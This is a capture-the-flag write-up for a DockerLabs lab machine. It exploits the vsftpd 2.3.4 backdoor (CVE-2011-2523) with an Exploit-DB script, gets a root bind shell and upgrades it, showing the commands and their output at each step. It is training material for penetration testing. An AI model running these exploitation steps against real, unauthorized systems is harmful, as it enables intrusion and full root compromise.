# firsthacking

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| firsthacking | El Pingüino de Mario | Very Easy | dockerlabs |

**Summary:** The target machine exposed a single service: an FTP server running vsftpd version 2.3.4, a version infamous for a deliberately planted backdoor introduced in 2011 (CVE-2011-2523). The backdoor is triggered by sending a username containing a smiley face sequence (`:)`) during an FTP authentication attempt, which causes the daemon to open a bind shell on TCP port 6200. Because the vsftpd process runs as root inside the container, the shell spawned by the exploit is immediately a root shell, collapsing the entire attack into a single step: reconnaissance to confirm the vulnerable version, exploit execution, and direct root-level code execution. No password cracking, no lateral movement, and no secondary privilege escalation were necessary. The machine serves as a textbook demonstration of the catastrophic risk posed by using software from unverified, tampered-with source distributions.

---

## Reconnaissance

The engagement began by deploying the Docker target and noting its assigned IP address, `172.17.0.2`. A comprehensive Nmap scan covering all 65535 TCP ports was launched immediately to build a full picture of the attack surface.

**1.** Deploy the machine and record the IP address:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~/dockerlabs/firsthacking]
└─$ sudo bash auto_deploy.sh firsthacking.tar
[sudo] password for ouba:

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

**2.** Set convenient shell variables and run the full-port service scan:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/firsthacking]
└─$ ip=172.17.0.2 && url=http://$ip

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/firsthacking]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-10 18:30 +07
Nmap scan report for 172.17.0.2
Host is up (0.000010s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4.45 seconds
```

The results were unambiguous: the only open port was **TCP 21**, hosting **vsftpd 2.3.4**. This version string is immediately recognizable to any seasoned penetration tester. The entire attack surface collapsed to a single, well-documented vulnerability.

---

## Initial Enumeration of the FTP Service

Before reaching for an exploit, a quick probe of the FTP service was attempted using anonymous authentication to check for any publicly accessible content.

**3.** Attempt an anonymous FTP login:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/firsthacking]
└─$ ftp $ip
Connected to 172.17.0.2.
220 (vsFTPd 2.3.4)
Name (172.17.0.2:ouba): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
ftp: Login failed
ftp> exit
221 Goodbye.
```

Anonymous access was denied. The server confirmed the banner `vsFTPd 2.3.4`, which is sufficient information to proceed directly to exploit research.

---

## Vulnerability Research and Exploit Staging

**4.** Search the local Exploit-DB mirror for known vulnerabilities affecting vsftpd 2.3.4:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/firsthacking]
└─$ searchsploit vsftpd 2.3.4
----------------------------------------- ---------------------------------
 Exploit Title                           |  Path
----------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Executio | unix/remote/17491.rb
vsftpd 2.3.4 - Backdoor Command Executio | unix/remote/49757.py
----------------------------------------- ---------------------------------
Shellcodes: No Results
```

Two exploits surfaced: a Metasploit module (`17491.rb`) and a standalone Python script (`49757.py`). The Python script was selected to keep the exploitation manual and dependency-light.

**5.** Mirror the exploit to the local working directory and inspect its usage:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/firsthacking]
└─$ searchsploit -m unix/remote/49757.py
  Exploit: vsftpd 2.3.4 - Backdoor Command Execution
      URL: https://www.exploit-db.com/exploits/49757
     Path: /usr/share/exploitdb/exploits/unix/remote/49757.py
    Codes: CVE-2011-2523
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /tmp/firsthacking/49757.py
```

The exploit is catalogued under **CVE-2011-2523** and is marked as verified by Exploit-DB. A quick help check confirmed the interface accepts a single positional argument: the target host address.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/firsthacking]
└─$ python2 49757.py -h
usage: 49757.py [-h] host

positional arguments:
  host        input the address of the vulnerable host

optional arguments:
  -h, --help  show this help message and exit
```

---

## Exploitation and Root Access

The backdoor in vsftpd 2.3.4 works by monitoring the FTP username field for the string `:)`. When detected, the daemon forks a process and binds a command shell to port 6200 without any authentication. Because vsftpd runs as root on this target, the shell is immediately a root shell.

**6.** Execute the exploit against the target:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/firsthacking]
└─$ python2 49757.py $ip
Success, shell opened
Send `exit` to quit shell
id
uid=0(root) gid=0(root) groups=0(root)
which script
/usr/bin/script
/usr/bin/script -qc /bin/bash /dev/null
root@b7b1d93059ae:~/vsftpd-2.3.4# id;whoami;hostname
id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
b7b1d93059ae
```

The exploit reported `Success, shell opened` and the very first command, `id`, confirmed `uid=0(root)`. The `script` utility was used to upgrade to a fully interactive PTY via `/usr/bin/script -qc /bin/bash /dev/null`. The identity was triple-confirmed with the chained `id;whoami;hostname` command, showing root privileges on the container host `b7b1d93059ae`.

---

## Attack Chain Summary

1. **Reconnaissance**: A full TCP port scan with Nmap identified a single open service: FTP on port 21 running vsftpd version 2.3.4, immediately flagging the target as vulnerable to a known backdoor.

2. **Vulnerability Discovery**: `searchsploit` was used to locate two public exploits for CVE-2011-2523 within the local Exploit-DB database. The standalone Python exploit `49757.py` was selected and mirrored to the working directory.

3. **Exploitation**: The Python exploit was executed against the target IP. It triggered the vsftpd backdoor by injecting a smiley-face sequence into the FTP username field, causing the daemon to open a bind shell on port 6200.

4. **Shell Stabilization**: The raw shell was upgraded to a fully interactive PTY session using the `script` utility, enabling a stable and functional terminal environment.

5. **Privilege Confirmation**: Because vsftpd was running as root, the spawned shell provided immediate, unrestricted root access. No privilege escalation steps were required. Root identity was confirmed with `id`, `whoami`, and `hostname`.
